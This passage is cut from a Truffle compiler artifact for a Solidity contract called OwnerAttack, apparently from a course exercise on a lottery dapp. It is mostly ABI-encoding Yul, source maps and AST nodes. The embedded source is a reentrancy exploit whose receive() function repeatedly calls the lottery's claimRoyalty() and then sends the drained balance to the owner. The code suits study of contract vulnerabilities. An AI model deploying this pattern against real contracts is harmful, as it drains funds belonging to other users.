          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1168:73:7",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1185:3:7"
                      },
                      {
                        "name": "length",
                        "nodeType": "YulIdentifier",
                        "src": "1190:6:7"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1178:6:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1178:19:7"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1178:19:7"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "1206:29:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1225:3:7"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1230:4:7",
                        "type": "",
                        "value": "0x20"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "1221:3:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1221:14:7"
                  },
                  "variableNames": [
                    {
                      "name": "updated_pos",
                      "nodeType": "YulIdentifier",
                      "src": "1206:11:7"
                    }
                  ]
                }
              ]
            },
            "name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "1140:3:7",
                "type": ""
              },
              {
                "name": "length",
                "nodeType": "YulTypedName",
                "src": "1145:6:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "updated_pos",
                "nodeType": "YulTypedName",
                "src": "1156:11:7",
                "type": ""
              }
            ],
            "src": "1072:169:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1353:122:7",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "memPtr",
                            "nodeType": "YulIdentifier",
                            "src": "1375:6:7"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1383:1:7",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1371:3:7"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1371:14:7"
                      },
                      {
                        "hexValue": "41747461636b204f6e6c79206f776e65722063616e20706572666f726d207468",
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "1387:34:7",
                        "type": "",
                        "value": "Attack Only owner can perform th"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1364:6:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1364:58:7"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1364:58:7"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "memPtr",
                            "nodeType": "YulIdentifier",
                            "src": "1443:6:7"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1451:2:7",
                            "type": "",
                            "value": "32"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1439:3:7"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1439:15:7"
                      },
                      {
                        "hexValue": "697320616374696f6e",
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "1456:11:7",
                        "type": "",
                        "value": "is action"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1432:6:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1432:36:7"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1432:36:7"
                }
              ]
            },
            "name": "store_literal_in_memory_0859789e6c9840c3200baab176b7164e05ba7e663f7b282ec15f4ae9e770efb5",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "memPtr",
                "nodeType": "YulTypedName",
                "src": "1345:6:7",
                "type": ""
              }
            ],
            "src": "1247:228:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1627:220:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "1637:74:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1703:3:7"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1708:2:7",
                        "type": "",
                        "value": "41"
                      }
                    ],
                    "functionName": {
                      "name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "1644:58:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1644:67:7"
                  },
                  "variableNames": [
                    {
                      "name": "pos",
                      "nodeType": "YulIdentifier",
                      "src": "1637:3:7"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1809:3:7"
                      }
                    ],
                    "functionName": {
                      "name": "store_literal_in_memory_0859789e6c9840c3200baab176b7164e05ba7e663f7b282ec15f4ae9e770efb5",
                      "nodeType": "YulIdentifier",
                      "src": "1720:88:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1720:93:7"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1720:93:7"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "1822:19:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1833:3:7"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1838:2:7",
                        "type": "",
                        "value": "64"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "1829:3:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1829:12:7"
                  },
                  "variableNames": [
                    {
                      "name": "end",
                      "nodeType": "YulIdentifier",
                      "src": "1822:3:7"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_t_stringliteral_0859789e6c9840c3200baab176b7164e05ba7e663f7b282ec15f4ae9e770efb5_to_t_string_memory_ptr_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "1615:3:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "1623:3:7",
                "type": ""
              }
            ],
            "src": "1481:366:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2024:248:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "2034:26:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "2046:9:7"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "2057:2:7",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "2042:3:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2042:18:7"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "2034:4:7"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "2081:9:7"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "2092:1:7",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "2077:3:7"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2077:17:7"
                      },
                      {
                        "arguments": [
                          {
                            "name": "tail",
                            "nodeType": "YulIdentifier",
                            "src": "2100:4:7"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "2106:9:7"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "2096:3:7"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2096:20:7"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "2070:6:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2070:47:7"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "2070:47:7"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "2126:139:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "tail",
                        "nodeType": "YulIdentifier",
                        "src": "2260:4:7"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_stringliteral_0859789e6c9840c3200baab176b7164e05ba7e663f7b282ec15f4ae9e770efb5_to_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "2134:124:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2134:131:7"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "2126:4:7"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_tuple_t_stringliteral_0859789e6c9840c3200baab176b7164e05ba7e663f7b282ec15f4ae9e770efb5__to_t_string_memory_ptr__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "2004:9:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "2019:4:7",
                "type": ""
              }
            ],
            "src": "1853:419:7"
          }
        ]
      },
      "contents": "{\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function identity(value) -> ret {\n        ret := value\n    }\n\n    function convert_t_uint160_to_t_uint160(value) -> converted {\n        converted := cleanup_t_uint160(identity(cleanup_t_uint160(value)))\n    }\n\n    function convert_t_uint160_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_uint160(value)\n    }\n\n    function convert_t_contract$_ILottery_$10265_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_address(value)\n    }\n\n    function abi_encode_t_contract$_ILottery_$10265_to_t_address_fromStack(value, pos) {\n        mstore(pos, convert_t_contract$_ILottery_$10265_to_t_address(value))\n    }\n\n    function abi_encode_tuple_t_contract$_ILottery_$10265__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_contract$_ILottery_$10265_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function store_literal_in_memory_0859789e6c9840c3200baab176b7164e05ba7e663f7b282ec15f4ae9e770efb5(memPtr) {\n\n        mstore(add(memPtr, 0), \"Attack Only owner can perform th\")\n\n        mstore(add(memPtr, 32), \"is action\")\n\n    }\n\n    function abi_encode_t_stringliteral_0859789e6c9840c3200baab176b7164e05ba7e663f7b282ec15f4ae9e770efb5_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 41)\n        store_literal_in_memory_0859789e6c9840c3200baab176b7164e05ba7e663f7b282ec15f4ae9e770efb5(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_tuple_t_stringliteral_0859789e6c9840c3200baab176b7164e05ba7e663f7b282ec15f4ae9e770efb5__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_0859789e6c9840c3200baab176b7164e05ba7e663f7b282ec15f4ae9e770efb5_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n}\n",
      "id": 7,
      "language": "Yul",
      "name": "#utility.yul"
    }
  ],
  "sourceMap": "250:834:3:-:0;;;465:131;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;543:23;516:51;;;;;;;;;;581:10;573:5;;:18;;;;;;;;;;;;;;;;;;465:131;250:834;;88:117:7;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;250:834:3:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;",
  "deployedSourceMap": "250:834:3:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;955:9;927:15;919:32;;;:45;915:163;;974:15;:28;;;:30;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;915:163;;;1033:5;;;;;;;;;;1025:23;;:46;1049:21;1025:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;915:163;250:834;;;;;600:91;;;:::i;:::-;;792:86;;;:::i;:::-;;419:41;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;600:91;330:5;;;;;;;;;;316:19;;:10;:19;;;308:73;;;;;;;;;;;;:::i;:::-;;;;;;;;;648:15:::1;:19;;;674:9;648:38;;;;;;;;;;;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;;;;;;600:91::o:0;792:86::-;330:5;;;;;;;;;;316:19;;:10;:19;;;308:73;;;;;;;;;;;;:::i;:::-;;;;;;;;;843:15:::1;:28;;;:30;;;;;;;;;;;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;;;;;792:86::o:0;419:41::-;;;:::o;7:126:7:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:60::-;167:3;188:5;181:12;;139:60;;;:::o;205:142::-;255:9;288:53;306:34;315:24;333:5;315:24;:::i;:::-;306:34;:::i;:::-;288:53;:::i;:::-;275:66;;205:142;;;:::o;353:126::-;403:9;436:37;467:5;436:37;:::i;:::-;423:50;;353:126;;;:::o;485:144::-;553:9;586:37;617:5;586:37;:::i;:::-;573:50;;485:144;;;:::o;635:167::-;740:55;789:5;740:55;:::i;:::-;735:3;728:68;635:167;;:::o;808:258::-;919:4;957:2;946:9;942:18;934:26;;970:89;1056:1;1045:9;1041:17;1032:6;970:89;:::i;:::-;808:258;;;;:::o;1072:169::-;1156:11;1190:6;1185:3;1178:19;1230:4;1225:3;1221:14;1206:29;;1072:169;;;;:::o;1247:228::-;1387:34;1383:1;1375:6;1371:14;1364:58;1456:11;1451:2;1443:6;1439:15;1432:36;1247:228;:::o;1481:366::-;1623:3;1644:67;1708:2;1703:3;1644:67;:::i;:::-;1637:74;;1720:93;1809:3;1720:93;:::i;:::-;1838:2;1833:3;1829:12;1822:19;;1481:366;;;:::o;1853:419::-;2019:4;2057:2;2046:9;2042:18;2034:26;;2106:9;2100:4;2096:20;2092:1;2081:9;2077:17;2070:47;2134:131;2260:4;2134:131;:::i;:::-;2126:139;;1853:419;;;:::o",
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// import \"@ganache/console.log/console.sol\";\n\n\ninterface ILottery {\n    function bet() external payable;\n    function claimPrize(uint _week) external;\n    function claimRoyalty() external;\n}\n\ncontract OwnerAttack {\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Attack Only owner can perform this action\");\n        _;\n    }\n  address owner;\n  ILottery public immutable lotteryContract;\n\n  constructor(address _lotteryContractAddress) {\n    lotteryContract = ILottery(_lotteryContractAddress);\n    owner = msg.sender;\n  }\n\n  function bet() external payable onlyOwner {\n    lotteryContract.bet{value:msg.value}();\n  }\n\n  // function claimRoyalty() external onlyOwner {\n  //   lotteryContract.claimRoyalty();\n  // }\n\n  function attack() external payable onlyOwner {\n    lotteryContract.claimRoyalty();\n  }\n\n  receive() external payable {\n    if (address(lotteryContract).balance >= msg.value) {\n      lotteryContract.claimRoyalty();\n    } else {\n      payable(owner).transfer(address(this).balance);\n    }\n  }\n}\n\n\n\n\n",
  "sourcePath": "/home/alex/Dapp/udemy/lottery/lottery_truffle5/truffle-files/contracts/OwnerAttack.sol",
  "ast": {
    "absolutePath": "project:/contracts/OwnerAttack.sol",
    "exportedSymbols": {
      "ILottery": [
        10265
      ],
      "OwnerAttack": [
        10357
      ]
    },
    "id": 10358,
    "license": "MIT",
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 10253,
        "literals": [
          "solidity",
          "^",
          "0.8",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "32:23:3"
      },
      {
        "abstract": false,
        "baseContracts": [],
        "canonicalName": "ILottery",
        "contractDependencies": [],
        "contractKind": "interface",
        "fullyImplemented": false,
        "id": 10265,
        "linearizedBaseContracts": [
          10265
        ],
        "name": "ILottery",
        "nameLocation": "115:8:3",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "functionSelector": "11610c25",
            "id": 10256,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "bet",
            "nameLocation": "139:3:3",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 10254,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "142:2:3"
            },
            "returnParameters": {
              "id": 10255,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "161:0:3"
            },
            "scope": 10265,
            "src": "130:32:3",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "functionSelector": "d7098154",
            "id": 10261,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "claimPrize",
            "nameLocation": "176:10:3",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 10259,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 10258,
                  "mutability": "mutable",
                  "name": "_week",
                  "nameLocation": "192:5:3",
                  "nodeType": "VariableDeclaration",
                  "scope": 10261,
                  "src": "187:10:3",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 10257,
                    "name": "uint",
                    "nodeType": "ElementaryTypeName",
                    "src": "187:4:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "186:12:3"
            },
            "returnParameters": {
              "id": 10260,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "207:0:3"
            },
            "scope": 10265,
            "src": "167:41:3",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "functionSelector": "900e92c4",
            "id": 10264,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "claimRoyalty",
            "nameLocation": "222:12:3",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 10262,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "234:2:3"
            },
            "returnParameters": {
              "id": 10263,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "245:0:3"
            },
            "scope": 10265,
            "src": "213:33:3",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 10358,
        "src": "105:143:3",
        "usedErrors": []
      },
      {
        "abstract": false,
        "baseContracts": [],
        "canonicalName": "OwnerAttack",
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 10357,
        "linearizedBaseContracts": [
          10357
        ],
        "name": "OwnerAttack",
        "nameLocation": "259:11:3",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "body": {
              "id": 10276,
              "nodeType": "Block",
              "src": "298:101:3",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 10271,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 10268,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 4294967281,
                            "src": "316:3:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 10269,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberLocation": "320:6:3",
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "src": "316:10:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "id": 10270,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 10279,
                          "src": "330:5:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "316:19:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "41747461636b204f6e6c79206f776e65722063616e20706572666f726d207468697320616374696f6e",
                        "id": 10272,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "337:43:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_0859789e6c9840c3200baab176b7164e05ba7e663f7b282ec15f4ae9e770efb5",
                          "typeString": "literal_string \"Attack Only owner can perform this action\""
                        },
                        "value": "Attack Only owner can perform this action"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_0859789e6c9840c3200baab176b7164e05ba7e663f7b282ec15f4ae9e770efb5",
                          "typeString": "literal_string \"Attack Only owner can perform this action\""
                        }
                      ],
                      "id": 10267,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        4294967278,
                        4294967278
                      ],
                      "referencedDeclaration": 4294967278,
                      "src": "308:7:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 10273,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "308:73:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 10274,
                  "nodeType": "ExpressionStatement",
                  "src": "308:73:3"
                },
                {
                  "id": 10275,
                  "nodeType": "PlaceholderStatement",
                  "src": "391:1:3"
                }
              ]
            },
            "id": 10277,
            "name": "onlyOwner",
            "nameLocation": "286:9:3",
            "nodeType": "ModifierDefinition",
            "parameters": {
              "id": 10266,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "295:2:3"
            },
            "src": "277:122:3",
            "virtual": false,
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 10279,
            "mutability": "mutable",
            "name": "owner",
            "nameLocation": "410:5:3",
            "nodeType": "VariableDeclaration",
            "scope": 10357,
            "src": "402:13:3",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 10278,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "402:7:3",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "functionSelector": "b29c662a",
            "id": 10282,
            "mutability": "immutable",
            "name": "lotteryContract",
            "nameLocation": "445:15:3",
            "nodeType": "VariableDeclaration",
            "scope": 10357,
            "src": "419:41:3",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_ILottery_$10265",
              "typeString": "contract ILottery"
            },
            "typeName": {
              "id": 10281,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 10280,
                "name": "ILottery",
                "nameLocations": [
                  "419:8:3"
                ],
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 10265,
                "src": "419:8:3"
              },
              "referencedDeclaration": 10265,
              "src": "419:8:3",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_ILottery_$10265",
                "typeString": "contract ILottery"
              }
            },
            "visibility": "public"
          },
          {
            "body": {
              "id": 10298,
              "nodeType": "Block",
              "src": "510:86:3",
              "statements": [
                {
                  "expression": {
                    "id": 10291,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 10287,
                      "name": "lotteryContract",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 10282,
                      "src": "516:15:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_ILottery_$10265",
                        "typeString": "contract ILottery"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 10289,
                          "name": "_lotteryContractAddress",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 10284,
                          "src": "543:23:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 10288,
                        "name": "ILottery",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 10265,
                        "src": "534:8:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_ILottery_$10265_$",
                          "typeString": "type(contract ILottery)"
                        }
                      },
                      "id": 10290,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "534:33:3",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_ILottery_$10265",
                        "typeString": "contract ILottery"
                      }
                    },
                    "src": "516:51:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_ILottery_$10265",
                      "typeString": "contract ILottery"
                    }
                  },
                  "id": 10292,
                  "nodeType": "ExpressionStatement",
                  "src": "516:51:3"
                },
                {
                  "expression": {
                    "id": 10296,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 10293,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 10279,
                      "src": "573:5:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "expression": {
                        "id": 10294,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 4294967281,
                        "src": "581:3:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 10295,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "585:6:3",
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "src": "581:10:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "573:18:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 10297,
                  "nodeType": "ExpressionStatement",
                  "src": "573:18:3"
                }
              ]
            },
            "id": 10299,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 10285,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 10284,
                  "mutability": "mutable",
                  "name": "_lotteryContractAddress",
                  "nameLocation": "485:23:3",
                  "nodeType": "VariableDeclaration",
                  "scope": 10299,
                  "src": "477:31:3",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 10283,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "477:7:3",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "476:33:3"
            },
            "returnParameters": {
              "id": 10286,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "510:0:3"
            },
            "scope": 10357,
            "src": "465:131:3",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 10312,
              "nodeType": "Block",
              "src": "642:49:3",
              "statements": [
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
